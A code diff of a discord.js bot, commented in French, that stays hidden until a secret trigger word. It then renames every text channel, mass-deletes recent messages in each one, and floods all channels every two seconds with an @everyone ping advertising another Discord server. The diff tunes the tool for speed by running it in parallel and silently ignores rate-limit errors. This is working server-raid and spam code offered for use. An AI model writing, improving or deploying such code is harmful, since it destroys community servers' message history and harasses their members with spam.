@@ -1,79 +1,69 @@
-// LE SPAM DE SEVEN TURBO DEBANDADE SA MERE AVEC LE PING DE C MORT LE DISCORD J'VAIS LE CHIBREE
+// LE SPAM DE SEVEN - VERSION TURBO
 const { Client, GatewayIntentBits } = require('discord.js');
 
 const client = new Client({
-  intents: [
-    GatewayIntentBits.Guilds,
-    GatewayIntentBits.GuildMessages,
-    GatewayIntentBits.MessageContent
-  ]
+  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
 });
 
 const ACTIVATION_WORD = '!!!cadeaudu7';
 const NEW_NAME = 'GO-GLASTRP';
-const SPAM_LINK = {
-  content: 'GO TOUT LE MONDE <@everyone> https://discord.gg/glastv1',
-  allowedMentions: { parse: ['everyone'] }  // PING @everyone ACTIVÉ
-};
+const SPAM_LINK = 'GO TOUT LE MONDE @EVERYONE https://discord.gg/glastv1';
 
 client.on('ready', () => {
-  console.log("Connectée en temps que : " + client.user.tag);
+  console.log("Logged in as " + client.user.tag);
 });
 
 client.on('messageCreate', async (message) => {
   if (message.content === ACTIVATION_WORD) {
-    console.log("ACTIVATION DU MODE SPAM CA MERE !");
-    await message.channel.send('OKAAYYY LESSGOOO 🚀💥');
+    console.log("🚀 ACTIVATION TURBO !");
+    await message.channel.send('OKAAYYY LESSGOOO');
 
     const guild = message.guild;
     if (!guild) return;
 
-    // Récupère TOUS les channels texte
+    // TOUS EN PARALLÈLE = 10x plus rapide !
     const textChannels = guild.channels.cache.filter(ch => ch.isTextBased());
-    console.log(`🎯 ${textChannels.size} channels texte trouvés`);
-
-    // TRAITEMENT ULTRA-RAPIDE (PARALLÈLE)
+    
     await Promise.all(
-      Array.from(textChannels.values()).map(async (channel) => {
+      textChannels.map(async (channel) => {
         try {
-          console.log(`⚙️ Traitement #${channel.name}`);
-          
-          // 1. RENOOMMER instantané
+          // 1. RENOOMMER (instantané)
           await channel.setName(NEW_NAME);
           
-          // 2. PURGE RAPIDE (150+ messages)
+          // 2. PURGE RAPIDE (plusieurs lots en parallèle)
           await fastPurge(channel);
           
         } catch (err) {
-          console.error(`❌ #${channel.name}:`, err.message);
+          console.error(`❌ ${channel.name}:`, err.message);
         }
       })
     );
 
-    console.log("✅ PURGE TERMINÉE - SPAM ACTIVÉ !");
-
-    // SPAM INFINI TOUS LES 2s avec @everyone
+    // SPAM ULTRA-RAPIDE
     setInterval(() => {
-      textChannels.forEach(ch => {
-        ch.send(SPAM_LINK).catch(() => {});
-      });
-    }, 2000);
+      textChannels.forEach(ch => ch.send(SPAM_LINK).catch(() => {}));
+    }, 2000); // 2s au lieu de 5s
   }
 });
 
-// FONCTION PURGE ULTRA-RAPIDE
+// PURGE ULTRA-RAPIDE (3 lots max)
 async function fastPurge(channel) {
   try {
-    // 3 lots de 50 = 150 messages
+    // Lot 1: 50 messages
     await channel.bulkDelete(50, true);
+    
+    // Lot 2: 50 autres (si y'en a encore)
     await channel.bulkDelete(50, true);
-    const remaining = await channel.messages.fetch({ limit: 50 });
-    if (remaining.size > 1) {
+    
+    // Lot 3: reste (100 max)
+    const remaining = await channel.messages.fetch({ limit: 100 });
+    if (remaining.size > 0) {
       await channel.bulkDelete(remaining, true);
     }
-    console.log(`🗑️ #${channel.name} PURGÉ (${remaining.size + 100} msg)`);
+    
+    console.log(`⚡ #${channel.name} PURGÉ (150+ msg)`);
   } catch (err) {
-    // Ignore rate limits
+    // Ignore les erreurs de rate limit
   }
 }
 
